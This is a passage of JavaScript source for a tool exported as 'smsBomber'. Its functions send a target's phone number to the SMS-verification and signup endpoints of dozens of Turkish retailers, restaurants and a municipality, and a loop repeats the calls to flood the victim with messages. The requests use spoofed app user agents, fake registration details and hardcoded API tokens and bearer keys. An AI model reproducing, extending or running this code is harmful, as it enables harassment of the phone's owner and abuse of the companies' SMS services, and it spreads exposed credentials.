                            chalk.redBright("[smsSystem] | [Ipragaz]") +
                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                    }
                });
            }

            function metro(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://feature.metro-tr.com:443/api/mobileAuth/validateSmsSend',
                    headers: {
                        "Accept": "*/*", 
                        "Content-Type": "application/json; charset=utf-8", 
                        "Accept-Encoding": "gzip, deflate", 
                        "Applicationversion": "2.1.1", 
                        "Applicationplatform": "2", 
                        "User-Agent": "Metro Turkiye/2.1.1 (com.mcctr.mobileapplication; build:1; iOS 15.7.7) Alamofire/2.1.1", 
                        "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9", 
                        "Connection": "close"
                    },
                    json: {
                        "methodType": "2",
                        "mobilePhoneNumber": `+90${no}`
                    }
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.greenBright("[smsSystem] | [Metro]") +
                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.redBright("[smsSystem] | [Metro]") +
                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                    }
                });
            }
            
            function happy(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://www.happy.com.tr:443/index.php?route=account/register/verifyPhone',
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", 
                        "Accept": "application/json, text/javascript, */*; q=0.01", 
                        "X-Requested-With": "XMLHttpRequest", 
                        "Accept-Language": "en-US,en;q=0.9", 
                        "Accept-Encoding": "gzip, deflate", 
                        "Origin": "https://www.happy.com.tr", 
                        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)", 
                        "Referer": "https://www.happy.com.tr/index.php?route=account/register"
                    },
                    json: {
                        "telephone": no,
                    },
                    timeout: 6000
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.greenBright("[smsSystem] | [Happy]") +
                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.redBright("[smsSystem] | [Happy]") +
                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                    }
                });
            }

            function komagene(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://gateway.komagene.com.tr/auth/auth/smskodugonder',
                    headers: {
                        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)"
                    },
                    json: {
                        "Telefon": no,
                        "FirmaId": "32"
                    },
                    timeout: 6000
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.greenBright("[smsSystem] | [Komagene]") +
                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.redBright("[smsSystem] | [Komagene]") +
                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                    }
                });
            }

            function kuryemgelsin(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://api.kuryemgelsin.com:443/tr/api/users/registerMessage/',
                    json: {
                        "phoneNumber": no,
                        "phone_country_code": "+90"
                    },
                    timeout: 6000
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.greenBright("[smsSystem] | [KuryemGelsin]") +
                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.redBright("[smsSystem] | [KuryemGelsin]") +
                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                    }
                });
            }

            function taksim(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://service.taksim.digital/services/PassengerRegister/Register',
                    headers: {
                        "Accept": "*/*", 
                        "Content-Type": "application/json; charset=utf-8", 
                        "Accept-Encoding": "gzip, deflate, br", 
                        "Accept-Language": "tr-TR,tr;q=0.9", 
                        "User-Agent": "TaksimProd/1 CFNetwork/1335.0.3.4 Darwin/21.6.0", 
                        "Token": "gcAvCfYEp7d//rR5A5vqaFB/Ccej7O+Qz4PRs8LwT4E="
                    },
                    json: {
                        "countryPhoneCode": '+90',
                        "name": "Memati",
                        "phoneNo": no,
                        "surname": "Bas",
                    },
                    timeout: 6000
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.greenBright("[smsSystem] | [Taksim]") +
                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.redBright("[smsSystem] | [Taksim]") +
                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                    }
                });
            }

            function toptanteslim(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://toptanteslim.com:443/Services/V2/MobilServis.aspx',
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded", 
                        "Accept": "application/json", 
                        "Mode": "no-cors", 
                        "U": "e-ticaret",
                        "User-Agent": "eTicDev/1 CFNetwork/1335.0.3.4 Darwin/21.6.0", 
                        "Accept-Language": "tr-TR,tr;q=0.9", 
                        "Accept-Encoding": "gzip, deflate, br"
                    },
                    json: {
                        "ADRES": "ZXNlZGtm", 
                        "DIL": "tr_TR", 
                        "EPOSTA": `${faker.internet.email()}`,
                        "EPOSTA_BILDIRIM": true, 
                        "ILCE": "BA\xc5\x9eAK\xc5\x9eEH\xc4\xb0R", 
                        "ISLEM": "KayitOl", 
                        "ISTEMCI": "BEABC9B2-A58F-3131-AF46-2FF404F79677", 
                        "KIMLIKNO": null, 
                        "KULLANICI_ADI": "Memati", 
                        "KULLANICI_SOYADI": "Bas", 
                        "PARA_BIRIMI": "TL", 
                        "PAROLA": "312C6383DE1465D08F635B6121C1F9B4", 
                        "POSTAKODU": "377777", 
                        "SEHIR": "\xc4\xb0STANBUL", 
                        "SEMT": "BA\xc5\x9eAK\xc5\x9eEH\xc4\xb0R MAH.", 
                        "SMS_BILDIRIM": true, 
                        "TELEFON": no,
                        "TICARI_UNVAN": "kdkd", 
                        "ULKE_ID": 1105, 
                        "VERGI_DAIRESI": "sjje", 
                        "VERGI_NU": ""
                    },
                    timeout: 6000
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.greenBright("[smsSystem] | [ToptanTeslim]") +
                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.redBright("[smsSystem] | [ToptanTeslim]") +
                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                    }
                });
            }

            function starbucks(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://auth.sbuxtr.com:443/signUp',
                    headers: {
                        "Content-Type": "application/json", 
                        "Operationchannel": "ios", 
                        "Accept": "*/*", 
                        "Accept-Encoding": "gzip, deflate, br"
                    },
                    json: {
                        "allowEmail": true, 
                        "allowSms": true, 
                        "deviceId": "31", 
                        "email": `${faker.internet.email()}`,
                        "firstName": "Memati", 
                        "lastName": "Bas", 
                        "password": "31ABC..abc31", 
                        "phoneNumber": no,
                        "preferredName": "Memati"
                    },
                    timeout: 6000
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.greenBright("[smsSystem] | [Starbucks]") +
                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.redBright("[smsSystem] | [Starbucks]") +
                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                    }
                });
            } 

            function baydoner(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp',
                    headers: {
                        "Content-Type": "application/json", 
                        "Accept": "*/*", 
                        "Accept-Language": "tr-TR,tr;q=0.9", 
                        "Platform": "1", 
                        "Accept-Encoding": "gzip, deflate, br", 
                        "User-Agent": "BaydonerCossla/163 CFNetwork/1335.0.3.4 Darwin/21.6.0"
                    },
                    json: {
                        "AppVersion": "1.3.2", 
                        "AreaCode": 90, 
                        "City": "ADANA", 
                        "CityId": 1, 
                        "Code": "", 
                        "Culture": "tr-TR", 
                        "DeviceId": "31s", 
                        "DeviceModel": "31", 
                        "DeviceToken": "3w1", 
                        "Email": `${faker.internet.email()}`,
                        "GDPRPolicy": false, 
                        "Gender": "Erkek", 
                        "GenderId": 1, 
                        "LoyaltyProgram": false, 
                        "merchantID": 5701, 
                        "Method": "",
                        "Name": "Memati", 
                        "notificationCode": "31", 
                        "NotificationToken": "31", 
                        "OsSystem": "IOS", 
                        "Password": "31Memati31", 
                        "PhoneNumber": no,
                        "Platform": 1, 
                        "sessionID": "31", 
                        "socialId": "", 
                        "SocialMethod": "", 
                        "Surname": "Bas", 
                        "TempId": 942603, 
                        "TermsAndConditions": false
                    },
                    timeout: 6000
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.greenBright("[smsSystem] | [BayDöner]") +
                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.redBright("[smsSystem] | [BayDöner]") +
                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                    }
                });
            }

                function pidem(no) {
                    if (dataSb.success >= dataSb.amount) return systemFinished();
                    dataSb.total++;
                    request.post({
                        url: 'https://restashop.azurewebsites.net:443/graphql/',
                        headers: {
                            "Accept": "*/*", 
                            "Origin": "https://pidem.azurewebsites.net", 
                            "Content-Type": "application/json", 
                            "Authorization": "Bearer null", 
                            "Referer": "https://pidem.azurewebsites.net/", 
                            "Accept-Language": "tr-TR,tr;q=0.9", 
                            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)", 
                            "Accept-Encoding": "gzip, deflate, br"
                        },
                        json: {
                            "query": "\n  mutation ($phone: String) {\n    sendOtpSms(phone: $phone) {\n      resultStatus\n      message\n    }\n  }\n", "variables": {"phone": no}
                        },
                        timeout: 6000
                    }, function (err, httpResponse, body) {
                        if (httpResponse?.statusCode == 200) {
                            dataSb.success++;
                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                                chalk.greenBright("[smsSystem] | [Pidem]") +
                                chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                        } else {
                            dataSb.error++;
                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                                chalk.redBright("[smsSystem] | [Pidem]") +
                                chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                        }
                    });
                }

                function bodrumbelediyesi(no) {
                    if (dataSb.success >= dataSb.amount) return systemFinished();
                    dataSb.total++;
                    request.post({
                        url: 'https://gandalf.orwi.app:443/api/user/requestOtp',
                        headers: {
                            "Apikey": "Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE",
                        },
                        json: {
                            "gsm": "+90"+no,
                            "source": "orwi"
                        },
                        timeout: 6000
                    }, function (err, httpResponse, body) {
                        if (httpResponse?.statusCode == 200) {
                            dataSb.success++;
                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                                chalk.greenBright("[smsSystem] | [BodrumBelediyesi]") +
                                chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                        } else {
                            dataSb.error++;
                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                                chalk.redBright("[smsSystem] | [BodrumBelediyesi]") +
                                chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                        }
                    });
                }

            function frink(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://api.frink.com.tr:443/api/auth/postSendOTP',
                    headers: {
                        "Accept": "*/*", 
                        "Content-Type": "application/json", 
                        "Authorization": "", 
                        "Accept-Encoding": "gzip, deflate, br", 
                        "User-Agent": "Frink/1.4.6 (com.frink.userapp; build:1; iOS 15.8.0) Alamofire/4.9.1", 
                        "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", 
                        "Connection": "close"
                    },
                    json: {
                        "areaCode": "90", 
                        "etkContract": true, 
                        "language": "TR", 
                        "phoneNumber": "90"+no,
                    },
                    timeout: 6000
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.greenBright("[smsSystem] | [Fring]") +
                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.redBright("[smsSystem] | [Fring]") +
                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                    }
                });
            }

            function dominos(no) {
                if (dataSb.success >= dataSb.amount) return systemFinished();
                dataSb.total++;
                request.post({
                    url: 'https://frontend.dominos.com.tr:443/api/customer/sendOtpCode',
                    headers: {
                        "Content-Type": "application/json;charset=utf-8", 
                        "Accept": "application/json, text/plain, */*", 
                        "Authorization": "Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.ITty2sZk16QOidAMYg4eRqmlBxdJhBhueRLSGgSvcN3wj4IYX11FBA.N3uXdJFQ8IAFTnxGKOotRA.7yf_jrCVfl-MDGJjxjo3M8SxVkatvrPnTBsXC5SBe30x8edSBpn1oQ5cQeHnu7p0ccgUBbfcKlYGVgeOU3sLDxj1yVLE_e2bKGyCGKoIv-1VWKRhOOpT_2NJ-BtqJVVoVnoQsN95B6OLTtJBlqYAFvnq6NiQCpZ4o1OGNhep1TNSHnlUU6CdIIKWwaHIkHl8AL1scgRHF88xiforpBVSAmVVSAUoIv8PLWmp3OWMLrl5jGln0MPAlST0OP9Q964ocXYRfAvMhEwstDTQB64cVuvVgC1D52h48eihVhqNArU6-LGK6VNriCmofXpoDRPbctYs7V4MQdldENTrmVcMVUQtZJD-5Ev1PmcYr858ClLTA7YdJ1C6okphuDasvDufxmXSeUqA50-nghH4M8ofAi6HJlpK_P0x_upqAJ6nvZG2xjmJt4Pz_J5Kx_tZu6eLoUKzZPU3k2kJ4KsqaKRfT4ATTEH0k15OtOVH7po8lNwUVuEFNnEhpaiibBckipJodTMO8AwC4eZkuhjeffmf9A.QLpMS6EUu7YQPZm1xvjuXg", 
                        "Device-Info": "Unique-Info: 2BF5C76D-0759-4763-C337-716E8B72D07B Model: iPhone 31 Plus Brand-Info: Apple Build-Number: 7.1.0 SystemVersion: 15.8", 
                        "Appversion": "IOS-7.1.0", 
                        "Accept-Encoding": "gzip, deflate, br", 
                        "Accept-Language": "tr-TR,tr;q=0.9", 
                        "User-Agent": "Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0", 
                        "Servicetype": "CarryOut", 
                        "Locationcode": "undefined"
                    },
                    json: {
                        "email": `${faker.internet.email()}`,
                        "isSure": false, 
                        "mobilePhone": no,
                    },
                    timeout: 6000
                }, function (err, httpResponse, body) {
                    if (httpResponse?.statusCode == 200) {
                        dataSb.success++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.greenBright("[smsSystem] | [Dominos]") +
                            chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                    } else {
                        dataSb.error++;
                        console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                            chalk.redBright("[smsSystem] | [Dominos]") +
                            chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                    }
                });
            }

                function yapp(no) {
                    if (dataSb.success >= dataSb.amount) return systemFinished();
                    dataSb.total++;
                    request.post({
                        url: 'https://api.yapp.com.tr:443/api/v1/auth/phone',
                        json: {
                            "app_version": "1.1.2", 
                            "code": "tr", 
                            "device_model": "iPhone9,4", 
                            "device_name": "", 
                            "device_type": "I", 
                            "device_version": "15.7.8", 
                            "email": `${faker.internet.email()}`,
                            "firstname": "Memati", 
                            "is_allow_to_communication": "1", 
                            "language_id": "1", 
                            "lastname": "Bas", 
                            "phone_number": no,
                            "sms_code": ""
                        },
                        timeout: 6000
                    }, function (err, httpResponse, body) {
                        if (httpResponse?.statusCode == 200) {
                            dataSb.success++;
                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                                chalk.greenBright("[smsSystem] | [Yapp]") +
                                chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                        } else {
                            dataSb.error++;
                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                                chalk.redBright("[smsSystem] | [Yapp]") +
                                chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                        }
                    });
                }

                function porty(no) {
                    if (dataSb.success >= dataSb.amount) return systemFinished();
                    dataSb.total++;
                    request.post({
                        url: 'https://api.porty.com.tr:443/api/v1/auth/phone',
                        headers: {
                            "Accept": "*/*", 
                            "Content-Type": "application/json; charset=UTF-8", 
                            "Accept-Encoding": "gzip, deflate", 
                            "Accept-Language": "en-US,en;q=0.9", 
                            "User-Agent": "Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0", 
                            "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"
                        },
                        json: {
                            "job": "start_login", 
                            "phone": no,
                        },
                        timeout: 6000
                    }, function (err, httpResponse, body) {
                        if (httpResponse?.statusCode == 200) {
                            dataSb.success++;
                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                                chalk.greenBright("[smsSystem] | [Porty]") +
                                chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                        } else {
                            dataSb.error++;
                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                                chalk.redBright("[smsSystem] | [Porty]") +
                                chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                        }
                    });
                }

                function clickme(no) {
                    if (dataSb.success >= dataSb.amount) return systemFinished();
                    dataSb.total++;
                    request.post({
                        url: 'https://mobile-gateway.clickmelive.com:443/api/v2/authorization/code',
                        headers: {
                            "Content-Type": "application/json", 
                            "Authorization": "apiKey 617196fc65dc0778fb59e97660856d1921bef5a092bb4071f3c071704e5ca4cc", 
                            "Client-Version": "1.4.0", 
                            "Client-Device": "IOS", 
                            "Accept-Language": "tr-TR,tr;q=0.9", 
                            "Accept-Encoding": "gzip, deflate, br", 
                            "User-Agent": "ClickMeLive/20 CFNetwork/1335.0.3.4 Darwin/21.6.0"
                        },
                        json: {
                            "phone": no
                        },
                        timeout: 6000
                    }, function (err, httpResponse, body) {
                        if (httpResponse?.statusCode == 200) {
                            dataSb.success++;
                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                                chalk.greenBright("[smsSystem] | [Clickme]") +
                                chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                        } else {
                            dataSb.error++;
                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                                chalk.redBright("[smsSystem] | [Clickme]") +
                                chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                        }
                    });
                }

                function akbati(no) {
                    if (dataSb.success >= dataSb.amount) return systemFinished();
                    dataSb.total++;
                    request.post({
                        url: 'https://akbati-admin.poilabs.com:443/v1/tr/sms',
                        headers: {
                            "Accept": "*/*", 
                            "Content-Type": "application/json", 
                            "X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3", 
                            "User-Agent": "Akbat", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", 
                            "Accept-Encoding": "gzip, deflate, br"
                        },
                        json: {
                            "phone": no
                        },
                        timeout: 6000
                    }, function (err, httpResponse, body) {
                        if (httpResponse?.statusCode == 200) {
                            dataSb.success++;
                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                                chalk.greenBright("[smsSystem] | [Akbati]") +
                                chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                        } else {
                            dataSb.error++;
                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                                chalk.redBright("[smsSystem] | [Akbati]") +
                                chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                        }
                    });
                }

                function akasya(no) {
                    if (dataSb.success >= dataSb.amount) return systemFinished();
                    dataSb.total++;
                    request.post({
                        url: 'https://akasya-admin.poilabs.com:443/v1/tr/sms',
                        headers: {
                            "Accept": "*/*", "Content-Type": "application/json", 
                            "X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5", 
                            "User-Agent": "Akasya", 
                            "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Accept-Encoding": "gzip, deflate, br"
                        },
                        json: {
                            "phone": no
                        },
                        timeout: 6000
                    }, function (err, httpResponse, body) {
                        if (httpResponse?.statusCode == 200) {
                            dataSb.success++;
                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                                chalk.greenBright("[smsSystem] | [Akbati]") +
                                chalk.blueBright(` ${no} numarasına sms gönderildi.`));
                        } else {
                            dataSb.error++;
                            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                                chalk.redBright("[smsSystem] | [Akbati]") +
                                chalk.blueBright(` ${no} numarasına sms gönderilemedi.`));
                        }
                    });
                }

            async function send(no) {
                kigili(no); // 1
                kahvedunyasi(no); // 2 
                wmf(no); // 3 |
                tiklagelsin(no); // 4 |
                bim(no); // 5
                sok(no); // 6
                migros(no); // 7
                a101(no); // 8
                sakasu(no); // 9
                zarinplus(no); // 10
                coregap(no); // 11
                icq(no); // 12
                naosstars(no); // 13
                rentiva(no); // 14
                loncamarket(no); // 15
                kimgb(no); // 16
                tazi(no); // 17
                evidea(no); // 18
                heyscooter(no); // 19
                koton(no); // 20
                ipragaz(no); // 21
                metro(no); // 22
                happy(no); // 23
                komagene(no); // 24
                kuryemgelsin(no); // 25
                taksim(no); // 26
                toptanteslim(no); // 27
                starbucks(no); // 28
                baydoner(no); // 29
                pidem(no); // 30
                bodrumbelediyesi(no); // 31
                frink(no); // 32
                dominos(no); // 33
                yapp(no); // 34
                clickme(no); // 35
                akbati(no); // 36
                akasya(no); // 37
            }

            for (let i = 0; i < amount; i++) {
                await send(phone);
                await delaySystem(1000);
            }

            async function systemFinished() {
                if (systemFinishedT == true) return;
                console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] > `) +
                    chalk.greenBright("[smsSystem]") +
                    chalk.blueBright(` Toplamda ${dataSb.total} adet sms gönderildi. (${dataSb.success} başarılı, ${dataSb.error} hatalı)`));
                const result = { status: true, dataSb };
                systemFinishedT = true;
               return resolve(result);
            }
        } catch (e) {
            console.error("Hata oluştu:", e);
            const result = { status: false, message: "Bir hata oluştu." };
            reject(result);
        }
    });

    const result = await queryPromise;
    if (result.status) {
        console.log(chalk.gray(`[${dayjs().format('YYYY-MM-DD HH:mm:ss')}] > `) + chalk.greenBright("[smsSystem]") + chalk.blueBright(` ${phone} numarasına ${amount} adet sms gönderildi.`));
        return { status: true, dataSb: result.dataSb };
    } else {
        return { status: false, message: result.message };
    }
}

module.exports = {
    smsBomber
}
